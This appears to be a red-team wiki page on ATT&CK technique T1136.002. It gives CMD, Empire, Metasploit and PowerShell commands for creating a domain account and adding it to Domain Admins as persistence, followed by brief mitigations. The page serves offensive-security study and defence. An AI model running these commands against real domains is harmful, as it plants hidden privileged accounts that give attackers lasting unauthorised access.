---
description: https://attack.mitre.org/techniques/T1136/002/
---

# Domain Account

**ATT\&CK ID:** [T1136.002](https://attack.mitre.org/techniques/T1136/002/)

**Permissions Required:** <mark style="color:red;">**Administrator**</mark>

**Description**

Adversaries may create a domain account to maintain access to victim systems. Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover user, administrator, and service accounts. With a sufficient level of access, the `net user /add /domain` command can be used to create a domain account.

Such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.

## **Techniques**

### **CMD**

```bash
# Create Domain User
net user "<Username>" "<Password>" /add /domain

# Add to Domain Admins Group
net group "Domain Admins" "<Username>" /add /domain
```

![](../../../../.gitbook/assets/netuser-domain.png)

### **Empire**

```bash
usemodule/powershell/persistence/misc/add_netuser

# Local account
set Domain ''
set UserName <Username>
execite

# Domain Account
set Domain <Domain>
set UserName <Username>
execute
```

![](<../../../../.gitbook/assets/image (1348).png>)

### Metasploit

```
use post/windows/manage/add_user 

# Change ADDTODOMAIN to FALSE to create local account

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   ADDTODOMAIN  true             yes       Add to Domain if true, otherwise add locally
   ADDTOGROUP   true             yes       Add group if it does not exist
   GROUP        Domain Admins    no        Add user into group, creating it if necessary
   PASSWORD     Password123      no        Password of the user
   SESSION      Session 1        yes       The session to run this module on
   TOKEN                         no        Username or PID of the token which will be used (if blank, Domain Admin tokens will be enumerated)
   USERNAME     ViperOne         yes       The username of the user to add (not-qualified, e.g. BOB)
```

### **PowerShell**

```powershell
$Name = "<Username>"
$Domain = "<Domain>"
$Password = "Password123"
$SecurePass = ConvertTo-SecureString -String $Password -AsPlainText -Force
$NewUser = New-ADUser `
    -Name "$Name"`
    -SamAccountName "$Name"`
    -UserPrincipalName "$Name@$Domain"`
    -AccountPassword $SecurePass;  
Enable-ADAccount -Identity "$Name";
Add-ADGroupMember -Identity "Domain Admins" -Members "$Name"
```

![](../../../../.gitbook/assets/PowerShell-New-ADUser.png)

## **Mitigation**

* Protect domain controllers by ensuring proper security configuration for critical servers.
* Configure access controls and firewalls to limit access to domain controllers and systems used to create and manage accounts.
* Use multi-factor authentication for user and privileged accounts.

## **Further Reading**

**CMD:** [**https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771865(v=ws.11)**](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771865\(v=ws.11\))\*\*\*\*

**PowerShell:** [**https://docs.microsoft.com/en-us/powershell/module/activedirectory/new-aduser?view=windowsserver2022-ps**](https://docs.microsoft.com/en-us/powershell/module/activedirectory/new-aduser?view=windowsserver2022-ps)\*\*\*\*

***
